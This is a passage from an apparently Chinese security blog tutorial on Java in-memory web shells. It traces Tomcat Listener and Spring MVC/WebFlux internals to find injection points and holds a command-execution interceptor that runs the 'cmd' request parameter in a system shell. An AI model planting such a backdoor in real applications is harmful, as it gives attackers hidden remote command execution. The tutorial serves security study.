- `HttpSessionAttributeListener`，监听`HTTP`会话属性的添加、删除和替换事件，需要实现`attributeAdded`、`attributeRemoved`和`attributeReplaced`这三个方法。

很明显，`ServletRequestListener`是最适合做内存马的，因为它只要访问服务就能触发操作。

## 2.8 编写一个简单的Listener（ServletRequestListener）

我们继续用我们之前在`2.2`中搭建的环境，替换掉之前的`TestFilter.java`，重新写一个`TestListener.java`：

```java
package org.example;

import javax.servlet.*;
import javax.servlet.annotation.WebListener;

@WebListener("/test")
public class TestListener implements ServletRequestListener {
    @Override
    public void requestDestroyed(ServletRequestEvent sre) {
        System.out.println("[+] destroy TestListener");
    }

    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        System.out.println("[+] initial TestListener");
    }
}
```

运行结果：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117193153492.png)

## 2.9 从代码层面分析Listener运行的整体流程

我们在如图所示的两个地方下断点调试：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117193334272.png)

往下翻可以看到`org.apache.catalina.core.StandardContext#listenerStart`方法的调用：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117193516785.png)

代码写的通俗易懂，主要有两个事情要干，一是通过`findApplicationListeners`找到这些`Listerner`的名字；二是实例化这些`listener`：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117213700704.png)

接着就是分类摆放，我们需要的`ServletRequestListener`被放在了`eventListeners`里面：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117223551872.png)

分类摆放完了之后，干这样一件事情：

```java
eventListeners.addAll(Arrays.asList(getApplicationEventListeners()));
```

`Arrays.asList(...)` 好理解，意思就是将数组转换为列表；`eventListeners.addAll(...)`也好理解，意思就是将括号里面的内容添加到之前实例化的监听器列表 `eventListeners` 中。关于括号里边的`org.apache.catalina.core.StandardContext#getApplicationEventListeners`这个方法，我们点进去看，代码如下：

```java
@Override
public Object[] getApplicationEventListeners() {
    return applicationEventListenersList.toArray();
}
```

也很简单明了，就是把`applicationEventListenersList`转换成一个包含任意类型对象的数组，也就是一个可能包含各种类型的应用程序事件监听器的数组。

那这总结起来就一句话，就是`Listener`有两个来源，一是根据`web.xml`文件或者`@WebListener`注解实例化得到的`Listener`；二是`applicationEventListenersList`中的`Listener`。前面的我们肯定没法控制，因为这是给开发者用的，不是给黑客用的哈哈哈。那就找找看，有没有类似之前我们用到的`addFilterConfig`这种函数呢？当然是有的，`ctrl+左键`往上找：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117225625995.png)

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117225704881.png)

方法名字叫做`addApplicationEventListener`，在`StandardContext.java`里面，代码如下，完美符合我们的需求，真是太哇塞了：

```java
public void addApplicationEventListener(Object listener) {
    applicationEventListenersList.add(listener);
}
```

## 2.10 简单的spring项目搭建

新建个项目，设置`Server URL`为`https://start.aliyun.com/`：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118010240710.png)

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118010435462.png)

等待依赖解析完成：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118010538774.png)

这里给我们准备了一个示例，我们可以直接跑起来：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118011103790.png)

### 2.10.1 编写一个简单的Spring Controller

```java
package org.example.springcontrollermemoryshellexample.demos.web;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

@Controller
public class TestController {
    @ResponseBody
    @RequestMapping("/")
    public String test(){
        return "hello world";
    }
}
```

非常地简单：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118011631123.png)

### 2.10.2 编写一个简单的Spring Interceptor

`TestInterceptor.java`：

```java
package org.example.springcontrollermemoryshellexample.demos.web;

import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class TestInterceptor extends HandlerInterceptorAdapter {
    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        String cmd = request.getParameter("cmd");
        if(cmd != null){
            try {
                java.io.PrintWriter writer = response.getWriter();
                String output = "";
                ProcessBuilder processBuilder;
                if(System.getProperty("os.name").toLowerCase().contains("win")){
                    processBuilder = new ProcessBuilder("cmd.exe", "/c", cmd);
                }else{
                    processBuilder = new ProcessBuilder("/bin/sh", "-c", cmd);
                }
                java.util.Scanner inputScanner = new java.util.Scanner(processBuilder.start().getInputStream()).useDelimiter("\\A");
                output = inputScanner.hasNext() ? inputScanner.next(): output;
                inputScanner.close();
                writer.write(output);
                writer.flush();
                writer.close();
            } catch (Exception ignored){}
            return false;
        }
        return true;
    }
}
```

`WebConfig.java`：

```java
package org.example.springcontrollermemoryshellexample.demos.web;

import org.springframework.context.annotation.Configuration;
import org.springframework.web.servlet.config.annotation.InterceptorRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;

@Configuration
public class WebConfig implements WebMvcConfigurer {

    @Override
    public void addInterceptors(InterceptorRegistry registry) {
        registry.addInterceptor(new TestInterceptor()).addPathPatterns("/**");
    }
}
```

`Controller`就是之前写的`TestController.java`，运行后访问`http://127.0.0.1:8080/?cmd=whoami`：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240119205649551.png)

### 2.10.3 编写一个简单的Spring WebFlux的Demo（基于Netty）

我们先聊聊怎么自己写一个`Spring WebFlux`框架的`demo`。

这里我们新建一个`SpringBoot`项目，取名`WebFluxMemoryShellDemo`：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240121181613825.png)

这里选择`Spring Reactive Web`：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240121182533113.png)

接着新建两个文件，这里为了方便，我把这两个文件放到`hello`文件夹下。

`GreetingHandler.java`：

```java
package org.example.webfluxmemoryshelldemo.hello;

import org.springframework.http.MediaType;
import org.springframework.stereotype.Component;
import org.springframework.web.reactive.function.BodyInserters;
import org.springframework.web.reactive.function.server.ServerRequest;
import org.springframework.web.reactive.function.server.ServerResponse;
import reactor.core.publisher.Mono;

@Component
public class GreetingHandler {
    public Mono<ServerResponse> hello(ServerRequest request) {
        return ServerResponse.ok().contentType(MediaType.TEXT_PLAIN).body(BodyInserters.fromValue("Hello, Spring!"));
    }
}
```

`GreetingRouter.java`：

```java
package org.example.webfluxmemoryshelldemo.hello;

import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.http.MediaType;
import org.springframework.web.reactive.function.server.*;

@Configuration
public class GreetingRouter {
    @Bean
    public RouterFunction<ServerResponse> route(GreetingHandler greetingHandler) {
        return RouterFunctions.route(RequestPredicates.GET("/hello").and(RequestPredicates.accept(MediaType.TEXT_PLAIN)), greetingHandler::hello);
    }
}
```

我们可以新建`main/resources`文件夹，然后新建`application.properties`，通过`server.port`来控制`netty`服务的端口：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240121182911474.png)

接着我们运行：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240121183100943.png)

这里我从`github`上找了一个项目，也可以很好地帮助我们理解这个框架是如何使用的，它采用的是`Netty`+`SpringWebFlux`：

> https://github.com/Java-Techie-jt/springboot-webflux-demo

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240121135125819.png)

随便访问个路由。例如`http://127.0.0.1:9191/customers/stream`：

![](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/image/customers_stream.gif)

## 2.11 Spring MVC介绍

如果想要深入理解`Spring MVC`框架型内存马，那么对`Spring MVC`的基础了解是非常必要的，本节就从源码层面和大家简单聊聊这个框架。

首先引用《`Spring in Action`》上的一张图（这里我重制了一下）来了解`Spring MVC`的核心组件和大致处理流程（不过我在第五版书上貌似没有找到这张图，有找到的小伙伴可以公众号后台私信我）：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/springmvc2.png)

可以看到，这里有一堆名词，我们一一来看：

- `DispatcherServlet`是前端控制器，它负责接收`Request`并将`Request`转发给对应的处理组件；
- `HandlerMapping`负责完成`url`到`Controller`映射，可以通过它来找到对应的处理`Request`的`Controller`；
- `Controller`处理`Request`，并返回`ModelAndVIew`对象，`ModelAndView`是封装结果视图的组件；
- ④~⑦表示视图解析器解析`ModelAndView`对象并返回对应的视图给客户端。

还有一个概念需要了解，就是`IOC`容器，因为这个名词会在本文后面的内容中提及。

`IOC`（控制反转）容器是`Spring`框架的核心概念之一，它的基本思想是将对象的创建、组装、管理等控制权从应用程序代码反转到容器，使得应用程序组件无需直接管理它们的依赖关系。`IOC`容器主要负责对象的创建、依赖注入、生命周期管理和配置管理等。`Spring`框架提供了多种实现`IOC`容器的方式，下面讲两种常见的：

- `BeanFactory`：`Spring`的最基本的`IOC`容器，提供了基本的`IOC`功能，只有在第一次请求时才创建对象。

- `ApplicationContext`：这是`BeanFactory`的扩展，提供了更多的企业级功能。`ApplicationContext`在容器启动时就预加载并初始化所有的单例对象，这样就可以提供更快的访问速度。

### 2.11.1 Spring MVC九大组件

这九大组件需要有个印象：

`DispatcherServlet`（派发`Servlet`）：负责将请求分发给其他组件，是整个`Spring MVC`流程的核心；
`HandlerMapping`（处理器映射）：用于确定请求的处理器（`Controller`）；
`HandlerAdapter`（处理器适配器）：将请求映射到合适的处理器方法，负责执行处理器方法；
`HandlerInterceptor`（处理器拦截器）：允许对处理器的执行过程进行拦截和干预；
`Controller`（控制器）：处理用户请求并返回适当的模型和视图；
`ModelAndView`（模型和视图）：封装了处理器方法的执行结果，包括模型数据和视图信息；
`ViewResolver`（视图解析器）：用于将逻辑视图名称解析为具体的视图对象；
`LocaleResolver`（区域解析器）：处理区域信息，用于国际化；
`ThemeResolver`（主题解析器）：用于解析`Web`应用的主题，实现界面主题的切换。

### 2.11.2 简单的源码分析

#### 2.11.2.1 九大组件的初始化

首先是找到`org.springframework.web.servlet.DispatcherServlet`，可以看到里面有很多组件的定义和初始化函数以及一些其他的函数：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118153801770.png)

但是没有`init()`函数，我们翻看其父类`FrameworkServlet`的父类`org.springframework.web.servlet.HttpServletBean`的时候发现有`init`函数：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118153925178.png)

代码如下：

```java
@Override
public final void init() throws ServletException {

    // Set bean properties from init parameters.
    PropertyValues pvs = new ServletConfigPropertyValues(getServletConfig(), this.requiredProperties);
    if (!pvs.isEmpty()) {
        try {
            BeanWrapper bw = PropertyAccessorFactory.forBeanPropertyAccess(this);
            ResourceLoader resourceLoader = new ServletContextResourceLoader(getServletContext());
            bw.registerCustomEditor(Resource.class, new ResourceEditor(resourceLoader, getEnvironment()));
            initBeanWrapper(bw);
            bw.setPropertyValues(pvs, true);
        }
        catch (BeansException ex) {
            if (logger.isErrorEnabled()) {
                logger.error("Failed to set bean properties on servlet '" + getServletName() + "'", ex);
            }
            throw ex;
        }
    }

    // Let subclasses do whatever initialization they like.
    initServletBean();
}
```

先是从`Servlet`的配置中获取初始化参数并创建一个`PropertyValues`对象，然后设置`Bean`属性；关键在最后一步，调用了`initServletBean`这个方法。

我们点进去之后发现该函数并没有写任何内容，说明应该是子类继承的时候`override`了该方法：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118154412364.png)

果不其然，我们在`org.springframework.web.servlet.FrameworkServlet`中成功找到了该方法：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118154436747.png)

代码如下：

```java
@Override
protected final void initServletBean() throws ServletException {
    getServletContext().log("Initializing Spring " + getClass().getSimpleName() + " '" + getServletName() + "'");
    if (logger.isInfoEnabled()) {
        logger.info("Initializing Servlet '" + getServletName() + "'");
    }
    long startTime = System.currentTimeMillis();

    try {
        this.webApplicationContext = initWebApplicationContext();
        initFrameworkServlet();
    }
    catch (ServletException | RuntimeException ex) {
        logger.error("Context initialization failed", ex);
        throw ex;
    }

    if (logger.isDebugEnabled()) {
        String value = this.enableLoggingRequestDetails ?
                "shown which may lead to unsafe logging of potentially sensitive data" :
                "masked to prevent unsafe logging of potentially sensitive data";
        logger.debug("enableLoggingRequestDetails='" + this.enableLoggingRequestDetails +
                "': request parameters and headers will be " + value);
    }

    if (logger.isInfoEnabled()) {
        logger.info("Completed initialization in " + (System.currentTimeMillis() - startTime) + " ms");
    }
}
```

这段代码的`log`和计时部分就不说了，我们捡关键的说。它先是调用`initWebApplicationContext`方法，初始化`IOC`容器，在初始化的过程中，会调用到这个`onRefresh`方法，一般来说这个方法是在容器刷新完成后被调用的回调方法，它执行一些在应用程序启动后立即需要完成的任务：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118155901114.png)

跟入该方法，可以看到其中默认为空：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118160618786.png)

说明在它的子类中应该会有`override`，果然我们定位到了`org.springframework.web.servlet.DispatcherServlet#	`方法：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118160730953.png)

这一下就明了了起来，这不是我们之前提到的九大组件嘛，到这一步就完成了`Spring MVC`的九大组件的初始化。

#### 2.11.2.2 url和Controller的关系的建立

你可能会有这样的一个疑惑：我们是用`@RequestMapping("/")`注解在方法上的，那`Spring MVC`是怎么根据这个注解就把对应的请求和这个方法关联起来的？

从上面的九大组件的初始化中可以看到，有个方法就叫做`initHandlerMappings`，我们点进去详细看看：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118170255776.png)

这段代码和自带的注释写的也比较通俗易懂，分为两部分，第一部分是去`ApplicationContext`（包括`ancestor contexts`）里面找所有实现了`HandlerMappings`接口的类，如果找到了至少一个符合条件的`HandlerMapping bean`，那就把它的值转化为列表，并按照Java的默认排序机制对它们进行排序，最后将排序后的列表赋值给 `this.handlerMappings`；那如果没有找到，`this.handlerMappings`就依然保持为`null`；如果不需要检测所有处理程序映射，那就尝试从`ApplicationContext`中获取名称为 `handlerMapping` 的`bean`，如果成功获取到了则将其作为单一元素的列表赋值给 `this.handlerMappings`，如果获取失败了，那也没关系，因为人家注释里面讲的很明白，会添加一个默认的`HandlerMapping`，这也就是我们要讲的第二部分的代码。

第二部分说的是，如果之前一套操作下来，`this.handlerMappings`还是为`null`，那么就调用 `getDefaultStrategies` 方法去获取默认的`HandlerMapping`，并将其赋给 `this.handlerMappings`。

这么一看的话，`org.springframework.web.servlet.DispatcherServlet#getDefaultStrategies`这个方法还是挺关键的，我们点进去看看：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118172033745.png)

这段代码挺有意思，先是加载资源文件，并将其内容以属性键值对的形式存储在`defaultStrategies`中；接下来从`strategyInterface`获取一个名称，然后用这个名称在`defaultStrategies`中查找相应的值，如果找到了，就将这个值按逗号分隔成类名数组，接着遍历这个类名数组，对于每个类名都执行以下两个操作：①尝试通过`ClassUtils.forName`方法加载该类 ②使用`createDefaultStrategy`方法创建该类的实例；最后将创建的策略对象添加到列表`strategies`中并返回。

那就很好奇了，这段代码中的`DEFAULT_STRATEGIES_PATH`里面有啥？`Ctrl+左键`追踪：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118174426118.png)

原来是一个名叫`DispatcherServlet.properties`的文件，我们可以在左侧的依赖列表里面很快地翻到它，因为它应该是和`DispatcherServlet.java`在一块儿的：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118174523396.png)

从文件内容中，我们可以很快地锁定关键信息：

```properties
org.springframework.web.servlet.HandlerMapping=org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping,\
	org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping,\
	org.springframework.web.servlet.function.support.RouterFunctionMapping
```

也就是说，会有三个值，分别是`BeanNameUrlHandlerMapping`、`RequestMappingHandlerMapping`和`RouterFunctionMapping`，我们一般用的是第二个，我们点进`org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping`看一下：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118174955839.png)

它的父类`RequestMappingInfoHandlerMapping`的父类`AbstractHandlerMethodMapping`实现了`InitializingBean`这个接口，这个接口用于在`bean`初始化完成后执行一些特定的自定义初始化逻辑。

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118175247104.png)

点进该接口，只有一个`afterPropertiesSet`方法，关于该方法的用途可以参考`https://www.python100.com/html/U711CO7MV79C.html`：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118175806150.png)

那我们就看看`AbstractHandlerMethodMapping`它是具体咋实现`InitializingBean`的`afterPropertiesSet`的吧：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118180208640.png)

重写的也很简单，调用`initHandlerMethods`这个方法，继续跟踪该方法：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118180258066.png)

注释里面写的很清楚：扫描`ApplicationContext`中的`bean`，然后检测并注册`handler methods`。

我们在`org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#initHandlerMethods`这里打下断点进行调试，到图中这一步之后`step into`：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118191019570.png)

我们来看`org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#processCandidateBean`这个方法的具体逻辑：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118191122592.png)

这里我们自然很好奇，这个`isHandler`是判断啥的，我们点进去看看：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118191924946.png)

可以看到，这里并没有给出实现，说明子类中应该会给出`override`，于是直接找到了`org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping#isHandler`：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118192146352.png)

很明显，`isHandler`是用来检测给定的`beanType`类是否带有`Controller`注解或者`RequestMapping`注解。

解决了这个，继续往后看，后面是调用了`detectHandlerMethods`这个方法，我们点进去看看：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118192734772.png)

我们分开来看，首先是这行代码，它是综合起来写的，意思是说，先判断`handler`是否是字符串类型，如果是，则通过`ApplicationContext`获取它的类型；否则，直接获取`handler`的类型。：

```java
Class<?> handlerType = (handler instanceof String ?
            obtainApplicationContext().getType((String) handler) : handler.getClass());
```

然后是这部分：

```java
Class<?> userType = ClassUtils.getUserClass(handlerType);
Map<Method, T> methods = MethodIntrospector.selectMethods(userType,
        (MethodIntrospector.MetadataLookup<T>) method -> {
            try {
                return getMappingForMethod(method, userType);
            }
            catch (Throwable ex) {
                throw new IllegalStateException("Invalid mapping on handler class [" +
                        userType.getName() + "]: " + method, ex);
            }
        });
```

先是获取处理器的用户类，用户类是没有经过代理包装的类，这样就可以确保获取到的是实际处理请求的类；然后是这个`selectMethods`方法，这个方法有两个参数，第一个参数就是用户类，第二个参数是一个回调函数。关键就在于理解这个回调函数的作用。对于每个方法，它会尝试调用`getMappingForMethod`来获取方法的映射信息。

我们点进这个方法，发现它是一个抽象方法：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118193938936.png)

那就去看看他的子类中有没有对应的实现，直接定位到`org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping#getMappingForMethod`：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118194251185.png)

我们在下图所示位置打断点调试：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118195411713.png)

分开来看，首先是第一行：

```java
RequestMappingInfo info = createRequestMappingInfo(method);
```

解析`Controller`类的方法中的注解，生成一个对应的`RequestMappingInfo`对象。我们可以`step into`进入`org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping#createRequestMappingInfo(java.lang.reflect.AnnotatedElement)`方法：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118195804561.png)

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118195850878.png)

可以看到这个`info`里面保存了访问该方法的`url pattern`是`"/"`，也就是我们在`TestController.java`所想要看到的当`@RequestMapping("/")`时，调用`test`方法。

继续一步步往下走，可以看到走到了`org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#detectHandlerMethods`的最后：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118200254342.png)

直接看`lambda`表达式里面的内容：

```java
Method invocableMethod = AopUtils.selectInvocableMethod(method, userType);
registerHandlerMethod(handler, invocableMethod, mapping);
```

意思是，先用`selectInvocableMethod`方法根据`method`和`userType`选择出一个可调用的方法，这样是为了处理可能存在的代理和`AOP`的情况，确保获取到的是可直接调用的原始方法；然后把`bean`、`Method`和`RequestMappingInfo`注册进`MappingRegistry`。

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118201648822.png)

到这里，`url`和`Controller`之间的关系是如何建立的问题就解决了。

#### 2.11.2.3 Spring Interceptor引入与执行流程分析

我们回顾之前聊到的`Controller`的思路和下面的`4.1`节中所展示的`Controller`内存马，可以考虑到这样一个问题：

> 随着微服务部署技术的迭代演进，大型业务系统在到达真正的应用服务器的时候，会经过一些系列的网关、复杂均衡以及防火墙等。所以如果你新建的`shell`路由不在这些网关的白名单中，那么就很有可能无法访问到，在到达应用服务器之前就会被丢弃。我们要达到的目的就是在访问正常的业务地址之前，就能执行我们的代码。所以，在注入`java`内存马时，尽量不要使用新的路由来专门处理我们注入的`webshell`逻辑，最好是在每一次请求到达真正的业务逻辑前，都能提前进行我们`webshell`逻辑的处理。在`tomcat`容器下，有`filter`、`listener`等技术可以达到上述要求。那么在 `spring` 框架层面下，有办法达到上面所说的效果吗？      ——摘编自`https://github.com/Y4tacker/JavaSec/blob/main/5.内存马学习/Spring/利用intercetor注入Spring内存马/index.md`和`https://landgrey.me/blog/19/`

答案是当然有，这就是我们要讲的`Spring Interceptor`，`Spring`框架中的一种拦截器机制。

那就不禁要问了：这个`Spring Interceptor`和我们之前所说的`Filter`的区别是啥？

> 参考：https://developer.aliyun.com/article/925400

主要有以下六个方面：

| 主要区别                 | 拦截器                                                   | 过滤器                      |
| ------------------------ | -------------------------------------------------------- | --------------------------- |
| 机制                     | `Java`反射机制                                           | 函数回调                    |
| 是否依赖`Servlet`容器    | 不依赖                                                   | 依赖                        |
| 作用范围                 | 对`action`请求起作用                                     | 对几乎所有请求起作用        |
| 是否可以访问上下文和值栈 | 可以访问                                                 | 不能访问                    |
| 调用次数                 | 可以多次被调用                                           | 在容器初始化时只被调用一次  |
| `IOC`容器中的访问        | 可以获取`IOC`容器中的各个`bean`（基于`FactoryBean`接口） | 不能在`IOC`容器中获取`bean` |

我们在`2.10.2`节中给出的`TestInterceptor.java`的`preHandle`函数这里下断点，然后访问`http://127.0.0.1:8080/?cmd=whoami`进入调试：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240119210645412.png)

一步步步入调试之后，发现进入`org.springframework.web.servlet.DispatcherServlet#doDispatch`方法：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240119211041073.png)

我们在`doDispatch`方法的第一行下断点，重新访问页面调试：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240119211454480.png)

看到了调用了`getHandler`这个函数，它的注释写的简单易懂：确定处理当前请求的`handler`，我们`step into`看看：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240119213144754.png)

通过遍历当前`handlerMapping`数组中的`handler`对象，来判断哪个`handler`来处理当前的`request`对象：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240119213521627.png)

继续步入这个函数里面所用到的`mapping.getHandler`方法，也就是`org.springframework.web.servlet.handler.AbstractHandlerMapping#getHandler`：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240119214714153.png)

代码简单易懂，先是通过`getHandlerInternal`来获取，如果获取不到，那就调用`getDefaultHandler`来获取默认的，如果还是获取不到，就直接返回`null`；然后检查`handler`是不是一个字符串，如果是，说明可能是一个`Bean`的名字，这样的话就通过`ApplicationContext`来获取对应名字的`Bean`对象，这样就确保 `handler` 最终会是一个合法的处理器对象；接着检查是否已经有缓存的请求路径，如果没有缓存就调用 `initLookupPath(request)` 方法来初始化请求路径的查找；最后通过 `getHandlerExecutionChain` 方法创建一个处理器执行链。

这么看下来，这个`getHandlerExecutionChain`方法很重要，我们步入看看：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240119220340092.png)

遍历`adaptedInterceptors`，判断拦截器是否是`MappedInterceptor`类型，如果是那就看`MappedInterceptor`是否匹配当前请求，如果匹配则将其实际的拦截器添加到执行链中，如果不是这个类型的那就直接将拦截器添加到执行链中。

再回到之前的`getHandler`方法中来，看看它的后半段：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240119223022260.png)

主要都是处理跨域资源共享（`CORS`）的逻辑，只需要知道在涉及`CORS`的时候把`request`、`executionChain`和`CORS`配置通过`getCorsHandlerExecutionChain`调用封装后返回就行了。

一步步执行回到一开始的`getHandler`中，这里就是调用`org.springframework.web.servlet.HandlerExecutionChain#applyPreHandle`方法来遍历所有拦截器进行预处理，后面的代码就基本不需要了解了：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240119223829102.png)

## 2.12 Spring WebFlux介绍与代码调试分析

`SpringWebFlux`是`Spring Framework 5.0`中引入的新的响应式`web`框架。传统的`Spring MVC`在处理请求时是阻塞的，即每个请求都会占用一个线程，如果有大量请求同时到达，就需要大量线程来处理，可能导致资源耗尽。为了解决这个问题，`WebFlux`引入了非阻塞的响应式编程模型，通过使用异步非阻塞的方式处理请求，能够更高效地支持大量并发请求，提高系统的吞吐量；并且它能够轻松处理长连接和`WebSocket`，适用于需要保持连接的应用场景，如实时通讯和推送服务；在微服务架构中，服务之间的通信往往需要高效处理，`WebFlux`可以更好地适应这种异步通信的需求。

关于`Reactive`和`Spring WebFlux`的相关知识，可以参考知乎上的这篇文章，讲的通俗易懂，很透彻：

> https://zhuanlan.zhihu.com/p/559158740

`WebFlux`框架开发的接口返回类型必须是`Mono<T>`或者是`Flux<T>`。因此我们第一个需要了解的就是什么是`Mono`以及什么是`Flux`。

### 2.12.1 什么是Mono？

`Mono`用来表示包含`0`或`1`个元素的异步序列，它是一种异步的、可组合的、能够处理异步数据流的类型。比方说当我们发起一个异步的数据库查询、网络调用或其他异步操作时，该操作的结果可以包装在`Mono`中，这样就使得我们可以以响应式的方式处理异步结果，而不是去阻塞线程等待结果返回，就像我们在`2.10.3`节中的那张`gif`图中所看到的那样。

下面我们来看看`Mono`常用的`api`：

|                             API                              |                             说明                             |                           代码示例                           |
| :----------------------------------------------------------: | :----------------------------------------------------------: | :----------------------------------------------------------: |
|                     `Mono.just(T data)`                      |               创建一个包含指定数据的 `Mono`。                |       `Mono<String> mono = Mono.just("Hello, Mono!");`       |
|                        `Mono.empty()`                        |                    创建一个空的 `Mono`。                     |           `Mono<Object> emptyMono = Mono.empty();`           |
|                `Mono.error(Throwable error)`                 |                 创建一个包含错误的 `Mono`。                  | `Mono<Object> errorMono = Mono.error(new RuntimeException("Something went wrong"));` |
|          `Mono.fromCallable(Callable<T> supplier)`           |    从 Callable 创建 `Mono`，表示可能抛出异常的异步操作。     | `Mono<String> resultMono = Mono.fromCallable(() -> expensiveOperation());` |
|            `Mono.fromRunnable(Runnable runnable)`            |     从 Runnable 创建 `Mono`，表示没有返回值的异步操作。      | `Mono<Void> runnableMono = Mono.fromRunnable(() -> performAsyncTask());` |
|                 `Mono.delay(Duration delay)`                 |             在指定的延迟后创建一个空的 `Mono`。              | `Mono<Object> delayedMono = Mono.delay(Duration.ofSeconds(2)).then(Mono.just("Delayed Result"));` |
| `Mono.defer(Supplier<? extends Mono<? extends T>> supplier)` |        延迟创建 `Mono`，直到订阅时才调用供应商方法。         | `Mono<String> deferredMono = Mono.defer(() -> Mono.just("Deferred Result"));` |
| `Mono.whenDelayError(Iterable<? extends Mono<? extends T>> monos)` | 将一组 `Mono` 合并为一个 `Mono`，当其中一个出错时，继续等待其他的完成。 | `Mono<String> resultMono = Mono.whenDelayError(Arrays.asList(mono1, mono2, mono3));` |
|   `Mono.map(Function<? super T, ? extends V> transformer)`   |                 对 `Mono` 中的元素进行映射。                 |   `Mono<Integer> resultMono = mono.map(s -> s.length());`    |
| `Mono.flatMap(Function<? super T, ? extends Mono<? extends V>> transformer)` |               对 `Mono` 中的元素进行异步映射。               | `Mono<Integer> resultMono = mono.flatMap(s -> Mono.just(s.length()));` |
|          `Mono.filter(Predicate<? super T> tester)`          |                    过滤 `Mono` 中的元素。                    | `Mono<String> filteredMono = mono.filter(s -> s.length() > 5);` |
|             `Mono.defaultIfEmpty(T defaultVal)`              |               如果 `Mono` 为空，则使用默认值。               | `Mono<String> resultMono = mono.defaultIfEmpty("Default Value");` |
| `Mono.onErrorResume(Function<? super Throwable, ? extends Mono<? extends T>> fallback)` |             在发生错误时提供一个备用的 `Mono`。              | `Mono<String> resultMono = mono.onErrorResume(e -> Mono.just("Fallback Value"));` |
|        `Mono.doOnNext(Consumer<? super T> consumer)`         |               在成功时执行操作，但不更改元素。               | `Mono<String> resultMono = mono.doOnNext(s -> System.out.println("Received: " + s));` |
